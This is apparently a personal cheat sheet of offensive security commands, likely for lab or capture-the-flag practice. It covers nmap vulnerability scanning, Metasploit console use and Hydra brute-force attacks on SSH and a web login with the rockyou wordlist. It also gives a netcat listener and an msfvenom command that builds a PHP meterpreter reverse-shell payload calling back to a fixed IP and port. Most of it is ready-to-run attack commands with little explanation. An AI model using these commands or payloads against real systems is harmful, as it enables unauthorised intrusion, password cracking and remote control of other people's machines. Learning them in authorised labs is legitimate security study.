---
tags:
  - programming/hacking/tools
  - programming/linux
---

# Commands

Commands that might be useful and why they might be useful. In general, I like to add `| tee name.log` after the
commands so that I have a record of what was found and don't have to run things multiple times. Assume that is after
every command.


# Nmap
Map out ports. See [NMAP Basic](NMAP%20Basic.md) and [NMAP Advanced](NMAP%20Advanced.md) for more.
```bash
    # vulnerability mapping
    nmap -sV -sC -script vuln blue.nmap XX.XX.XXX.XXX
    
    -h          # help
    -sS         # Secret scan
    -sU         # UDP scan
    -O          # Find operatin system
    -sV         # scan version
    -v          # Verbose
    -vv         # Double verbose
    -oX         # XML output
    -A          # Aggressive scan
    -T5         # Max timeout (insane mode)
    -p XX       # Specify port XX
    -F          # Fast scan (most common only)
    -p-         # Scan all ports
    --script    # Run scripts
    -Pn         # Run without pinging
```

# Metasploit

Start metasploit with `msfconsole`. See [Metasploit](Metasploit.md) for more
 
Console commands: 
```
    db_status       # database status
    help            # help commands
    ?               # help shortcut
    search          # find stuff
    use             # Actually use the module
    info            # Show info about module
    show options    # Shows options for module
    set [A] [B]     # Sets A to B. Use "show options" to see "A" options
    get [A]         # Shows value of "A". "Show options" shows all
    unset [A]       # Sets B to null
    spool           # Save output to file
    save            # Saves settings to file and can open later
```

# Deduplicate values

This is just a matter of sorting, finding unique and saving but can be EXTREMELY useful when trying to bruteforce with a
list that has duplicates.
```bash
sort input_file.txt | uniq > output_file.txt
```

# Using Hydra

See [Hydra](Hydra.md) for more

```bash
# ssh attack
hydra -l molly -P /usr/share/wordlists/rockyou.txt $ipadd -t 4 ssh

# login attack
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.127.253 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." -V -t 4
```

# Netcat

Use netcat to read from a port when using a reverse shell.

```bash
    nc -lvp 4444
```

# Msfvenom

This creates a reverse shell that goes back to the target machine. Using the command

```bash
    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.32 LPORT=4444 -f raw -o payload.php
```
